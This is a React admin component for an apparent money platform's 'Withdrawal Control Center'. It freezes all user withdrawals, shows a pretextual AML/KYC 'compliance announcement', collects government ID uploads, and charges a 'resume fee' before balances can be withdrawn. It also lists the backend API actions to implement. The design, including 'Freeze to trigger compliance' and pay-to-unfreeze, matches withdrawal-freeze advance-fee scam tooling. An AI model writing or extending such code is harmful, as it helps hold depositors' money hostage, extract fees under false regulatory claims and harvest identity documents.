"use client";
// components/AdminWithdrawalControl.tsx
// Paste this component anywhere in your admin page under a new "Withdrawals Control" tab.
// Add "withdrawal_control" to your Tab type and TABS array in app/admin/page.tsx
//
// Features:
//  1. Freeze ALL withdrawals globally with one click
//  2. Post a compliance announcement that users see before withdrawing
//  3. Set a fee users must pay to resume withdrawals (optional)
//  4. Set an ID upload requirement — users who submit get unfrozen individually

import { useEffect, useState } from "react";
import {
  Lock,
  Unlock,
  Bell,
  AlertTriangle,
  DollarSign,
  CheckCircle,
  XCircle,
  RefreshCw,
  Upload,
  Shield,
  Eye,
} from "lucide-react";

type WithdrawalStatus = {
  globally_frozen: boolean;
  announcement: string;
  announcement_title: string;
  require_id_upload: boolean;
  resume_fee: number;
  frozen_user_count: number;
  complied_count: number;
};

type FrozenUser = {
  id: string;
  email: string;
  full_name: string | null;
  balance_available: number;
  withdrawal_compliance_status: string | null;
  compliance_doc_url: string | null;
  compliance_submitted_at: string | null;
};

async function adminPost(action: string, payload = {}) {
  const r = await fetch("/api/admin", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action, ...payload }),
  });
  if (!r.ok) throw new Error(await r.text());
  return r.json();
}
async function adminGet(resource: string) {
  const r = await fetch(`/api/admin?resource=${resource}`);
  if (!r.ok) throw new Error(await r.text());
  return r.json();
}

export default function AdminWithdrawalControl() {
  const [status, setStatus] = useState<WithdrawalStatus | null>(null);
  const [frozenUsers, setFrozenUsers] = useState<FrozenUser[]>([]);
  const [loading, setLoading] = useState(true);
  const [busy, setBusy] = useState(false);
  const [toast, setToast] = useState<{ msg: string; ok: boolean } | null>(null);
  const [form, setForm] = useState({
    announcement_title: "",
    announcement: "",
    require_id_upload: false,
    resume_fee: "0",
  });

  function showToast(msg: string, ok = true) {
    setToast({ msg, ok });
    setTimeout(() => setToast(null), 3500);
  }

  async function load() {
    try {
      const [st, fu] = await Promise.all([
        adminGet("withdrawal_control_status"),
        adminGet("frozen_compliance_users"),
      ]);
      setStatus(st);
      setFrozenUsers(fu);
      setForm({
        announcement_title: st.announcement_title || "",
        announcement: st.announcement || "",
        require_id_upload: st.require_id_upload || false,
        resume_fee: String(st.resume_fee || 0),
      });
    } catch (e: any) {
      showToast(e.message, false);
    } finally {
      setLoading(false);
    }
  }
  useEffect(() => {
    load();
  }, []);

  async function run(action: string, payload = {}, msg = "Done") {
    setBusy(true);
    try {
      await adminPost(action, payload);
      showToast(msg);
      load();
    } catch (e: any) {
      showToast(e.message, false);
    } finally {
      setBusy(false);
    }
  }

  async function saveAnnouncement() {
    await run(
      "set_withdrawal_announcement",
      {
        announcement_title: form.announcement_title,
        announcement: form.announcement,
        require_id_upload: form.require_id_upload,
        resume_fee: parseFloat(form.resume_fee) || 0,
      },
      "Announcement saved — users will see this before withdrawing",
    );
  }

  async function approveCompliance(userId: string) {
    await run(
      "approve_withdrawal_compliance",
      { user_id: userId },
      "Compliance approved — withdrawals re-enabled for user",
    );
  }

  async function rejectCompliance(userId: string) {
    await run(
      "reject_withdrawal_compliance",
      { user_id: userId },
      "Compliance rejected — user notified",
    );
  }

  if (loading)
    return (
      <div className="flex items-center justify-center py-16">
        <div className="w-8 h-8 border-2 border-emerald-500/20 border-t-emerald-500 rounded-full animate-spin" />
      </div>
    );

  const pendingCount = frozenUsers.filter(
    (u) => u.compliance_doc_url && u.withdrawal_compliance_status === "pending",
  ).length;

  return (
    <div className="space-y-6">
      {toast && (
        <div
          className={`fixed top-4 right-4 z-50 px-4 py-3 rounded-xl text-sm font-semibold shadow-xl ${toast.ok ? "bg-emerald-500 text-slate-950" : "bg-red-500 text-white"}`}
        >
          {toast.msg}
        </div>
      )}

      {/* Title */}
      <div>
        <h2 className="text-white font-black text-xl">
          Withdrawal Control Center
        </h2>
        <p className="text-slate-500 text-xs mt-0.5">
          Freeze all withdrawals, post compliance announcements, and manage user
          ID submissions.
        </p>
      </div>

      {/* Status banner */}
      <div
        className={`rounded-2xl p-5 border flex items-start justify-between gap-4 ${status?.globally_frozen ? "bg-red-900/20 border-red-800/40" : "bg-emerald-900/10 border-emerald-800/30"}`}
      >
        <div className="flex items-center gap-3">
          <div
            className={`w-10 h-10 rounded-xl flex items-center justify-center ${status?.globally_frozen ? "bg-red-900/30 border border-red-800" : "bg-emerald-900/20 border border-emerald-800"}`}
          >
            {status?.globally_frozen ? (
              <Lock size={16} className="text-red-400" />
            ) : (
              <Unlock size={16} className="text-emerald-400" />
            )}
          </div>
          <div>
            <p
              className={`font-black text-base ${status?.globally_frozen ? "text-red-300" : "text-emerald-300"}`}
            >
              Withdrawals:{" "}
              {status?.globally_frozen ? "GLOBALLY FROZEN" : "OPEN"}
            </p>
            <p className="text-slate-500 text-xs mt-0.5">
              {status?.globally_frozen
                ? `All ${status.frozen_user_count || "all"} users are blocked from withdrawing · ${status.complied_count || 0} have complied`
                : "Users can withdraw normally. Freeze to trigger compliance."}
            </p>
          </div>
        </div>
        <div className="flex gap-2 shrink-0">
          <button
            onClick={() =>
              run(
                status?.globally_frozen
                  ? "unfreeze_all_withdrawals"
                  : "freeze_all_withdrawals",
                {},
                status?.globally_frozen
                  ? "All withdrawals unfrozen"
                  : "All withdrawals frozen",
              )
            }
            disabled={busy}
            className={`flex items-center gap-2 font-black text-sm px-4 py-2.5 rounded-xl transition-all ${
              status?.globally_frozen
                ? "bg-emerald-500 hover:bg-emerald-400 text-slate-950"
                : "bg-red-600 hover:bg-red-500 text-white"
            } disabled:opacity-40`}
          >
            {status?.globally_frozen ? (
              <>
                <Unlock size={14} />
                Unfreeze All
              </>
            ) : (
              <>
                <Lock size={14} />
                Freeze All Withdrawals
              </>
            )}
          </button>
          <button
            onClick={load}
            className="p-2.5 border border-slate-700 rounded-xl text-slate-400 hover:text-white transition-colors"
          >
            <RefreshCw size={14} className={busy ? "animate-spin" : ""} />
          </button>
        </div>
      </div>

      {/* Compliance Announcement Builder */}
      <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 space-y-4">
        <div className="flex items-center gap-2">
          <Bell size={15} className="text-amber-400" />
          <h3 className="text-white font-bold text-sm">
            Compliance Announcement
          </h3>
          <span className="text-[10px] text-slate-500">
            — shown to users when they try to withdraw
          </span>
        </div>

        <div className="space-y-1.5">
          <label className="text-slate-400 text-xs font-semibold">
            Announcement Title
          </label>
          <input
            value={form.announcement_title}
            onChange={(e) =>
              setForm((p) => ({ ...p, announcement_title: e.target.value }))
            }
            placeholder="e.g. Identity Verification Required — Regulatory Compliance"
            className="w-full bg-slate-800 border border-slate-700 text-white rounded-xl px-3 py-2.5 text-sm outline-none focus:border-amber-500/40"
          />
        </div>

        <div className="space-y-1.5">
          <label className="text-slate-400 text-xs font-semibold">
            Announcement Body
          </label>
          <textarea
            value={form.announcement}
            onChange={(e) =>
              setForm((p) => ({ ...p, announcement: e.target.value }))
            }
            rows={4}
            placeholder="e.g. In compliance with government Anti-Money Laundering (AML) regulations and KYC directives, all users are required to upload a valid government-issued ID before processing withdrawals. This is a one-time verification. Failure to comply within 7 days may result in account suspension."
            className="w-full bg-slate-800 border border-slate-700 text-white rounded-xl px-3 py-2.5 text-sm resize-none outline-none focus:border-amber-500/40"
          />
        </div>

        <div className="grid md:grid-cols-2 gap-4">
          <div className="flex items-center gap-3 bg-slate-800/60 rounded-xl p-3">
            <button
              onClick={() =>
                setForm((p) => ({
                  ...p,
                  require_id_upload: !p.require_id_upload,
                }))
              }
              className={`w-10 h-5 rounded-full transition-all relative shrink-0 ${form.require_id_upload ? "bg-amber-500" : "bg-slate-700"}`}
            >
              <div
                className={`absolute top-0.5 w-4 h-4 bg-white rounded-full transition-all ${form.require_id_upload ? "left-5" : "left-0.5"}`}
              />
            </button>
            <div>
              <p className="text-white text-sm font-semibold">
                Require ID Upload to Unfreeze
              </p>
              <p className="text-slate-500 text-[10px]">
                User submits ID → you review → individually unfreeze
              </p>
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-slate-400 text-xs font-semibold">
              Resume Fee (optional, USD)
            </label>
            <div className="flex gap-2">
              <input
                type="number"
                step="0.01"
                min="0"
                value={form.resume_fee}
                onChange={(e) =>
                  setForm((p) => ({ ...p, resume_fee: e.target.value }))
                }
                placeholder="0.00"
                className="flex-1 bg-slate-800 border border-slate-700 text-white rounded-xl px-3 py-2 text-sm outline-none"
              />
              <span className="flex items-center text-slate-500 text-xs px-2">
                USD
              </span>
            </div>
            <p className="text-slate-600 text-[10px]">
              Users pay this amount before withdrawals resume. Set 0 to skip.
            </p>
          </div>
        </div>

        {/* Preview */}
        {(form.announcement_title || form.announcement) && (
          <div className="bg-amber-900/20 border border-amber-800/30 rounded-xl p-4 space-y-2">
            <p className="text-amber-400 text-[9px] font-bold uppercase tracking-widest">
              Preview — User sees this:
            </p>
            <p className="text-amber-300 font-bold text-sm">
              {form.announcement_title || "(No title)"}
            </p>
            <p className="text-amber-400/80 text-xs leading-relaxed">
              {form.announcement || "(No body)"}
            </p>
            {form.require_id_upload && (
              <div className="flex items-center gap-2 text-xs text-amber-300 font-semibold">
                <Upload size={12} /> Upload your ID to resume withdrawals
              </div>
            )}
            {parseFloat(form.resume_fee) > 0 && (
              <div className="flex items-center gap-2 text-xs text-amber-300 font-semibold">
                <DollarSign size={12} /> Pay $
                {parseFloat(form.resume_fee).toFixed(2)} compliance fee to
                resume
              </div>
            )}
          </div>
        )}

        <button
          onClick={saveAnnouncement}
          disabled={busy}
          className="flex items-center gap-2 bg-amber-500 hover:bg-amber-400 text-slate-950 font-black px-5 py-2.5 rounded-xl text-sm disabled:opacity-40 transition-all"
        >
          <Bell size={14} /> Save & Publish Announcement
        </button>
      </div>

      {/* Compliance Submissions */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <div>
            <h3 className="text-white font-bold text-sm flex items-center gap-2">
              <Shield size={14} className="text-violet-400" />
              Compliance Submissions
              {pendingCount > 0 && (
                <span className="bg-red-500 text-white text-[9px] font-black px-1.5 py-0.5 rounded-full">
                  {pendingCount}
                </span>
              )}
            </h3>
            <p className="text-slate-500 text-xs mt-0.5">
              {frozenUsers.length} users affected ·{" "}
              {frozenUsers.filter((u) => u.compliance_doc_url).length} submitted
              ID
            </p>
          </div>
        </div>

        {frozenUsers.length === 0 ? (
          <div className="text-center py-12 border border-dashed border-slate-800 rounded-2xl text-slate-500">
            <Shield size={28} className="mx-auto mb-2 opacity-30" />
            No frozen users
          </div>
        ) : (
          <div className="space-y-2">
            {frozenUsers.map((u) => {
              const hasDoc = Boolean(u.compliance_doc_url);
              const isPending = u.withdrawal_compliance_status === "pending";
              const isApproved = u.withdrawal_compliance_status === "approved";
              return (
                <div
                  key={u.id}
                  className={`border rounded-2xl p-4 ${isApproved ? "bg-emerald-900/10 border-emerald-800/30" : hasDoc && isPending ? "bg-violet-900/10 border-violet-800/30" : "bg-slate-900/60 border-slate-800"}`}
                >
                  <div className="flex items-start justify-between gap-4">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 flex-wrap mb-1">
                        <p className="text-white font-semibold text-sm">
                          {u.full_name || u.email}
                        </p>
                        {isApproved && (
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full border text-emerald-400 bg-emerald-900/20 border-emerald-800">
                            APPROVED
                          </span>
                        )}
                        {isPending && hasDoc && (
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full border text-violet-400 bg-violet-900/20 border-violet-800">
                            ID SUBMITTED
                          </span>
                        )}
                        {!hasDoc && (
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full border text-red-400 bg-red-900/20 border-red-800">
                            NO SUBMISSION
                          </span>
                        )}
                      </div>
                      <p className="text-slate-500 text-xs">{u.email}</p>
                      <p className="text-slate-600 text-[10px] mt-0.5">
                        Balance: ${(u.balance_available || 0).toFixed(2)}
                      </p>
                      {u.compliance_submitted_at && (
                        <p className="text-slate-600 text-[10px]">
                          Submitted:{" "}
                          {new Date(u.compliance_submitted_at).toLocaleString()}
                        </p>
                      )}
                    </div>
                    <div className="flex gap-2 shrink-0 items-start">
                      {u.compliance_doc_url && (
                        <a
                          href={u.compliance_doc_url}
                          target="_blank"
                          rel="noreferrer"
                          className="flex items-center gap-1.5 text-blue-400 text-[10px] font-semibold border border-blue-800/40 bg-blue-900/10 px-3 py-2 rounded-xl hover:bg-blue-900/20 transition-all"
                        >
                          <Eye size={11} /> View ID
                        </a>
                      )}
                      {hasDoc && isPending && (
                        <>
                          <button
                            onClick={() => approveCompliance(u.id)}
                            className="flex items-center gap-1 text-[10px] font-bold px-3 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl transition-all"
                          >
                            <CheckCircle size={11} /> Approve
                          </button>
                          <button
                            onClick={() => rejectCompliance(u.id)}
                            className="flex items-center gap-1 text-[10px] font-bold px-3 py-2 bg-red-900/30 hover:bg-red-600 text-red-300 hover:text-white rounded-xl border border-red-900/40 transition-all"
                          >
                            <XCircle size={11} /> Reject
                          </button>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Admin API additions notice */}
      <div className="bg-slate-800/40 border border-slate-700 rounded-xl p-4 text-xs text-slate-500 space-y-1">
        <p className="text-slate-400 font-semibold">
          ⚙ Required API actions to add to{" "}
          <code className="text-slate-300">app/api/admin/route.ts</code>:
        </p>
        {[
          "freeze_all_withdrawals      — sets global_freeze=true in app_config",
          "unfreeze_all_withdrawals    — sets global_freeze=false in app_config",
          "set_withdrawal_announcement — saves announcement text + settings to app_config",
          "approve_withdrawal_compliance — sets user withdrawal_compliance_status=approved, unfreezes user",
          "reject_withdrawal_compliance  — sets status=rejected, notifies user",
        ].map((l) => (
          <p key={l} className="font-mono text-slate-600">
            {l}
          </p>
        ))}
        <p className="text-slate-400 font-semibold mt-2">
          Required GET resources:
        </p>
        {[
          "withdrawal_control_status   — returns globally_frozen, announcement, frozen_user_count etc from app_config",
          "frozen_compliance_users     — returns users WHERE withdrawals_frozen=true with compliance doc URL",
        ].map((l) => (
          <p key={l} className="font-mono text-slate-600">
            {l}
          </p>
        ))}
      </div>
    </div>
  );
}
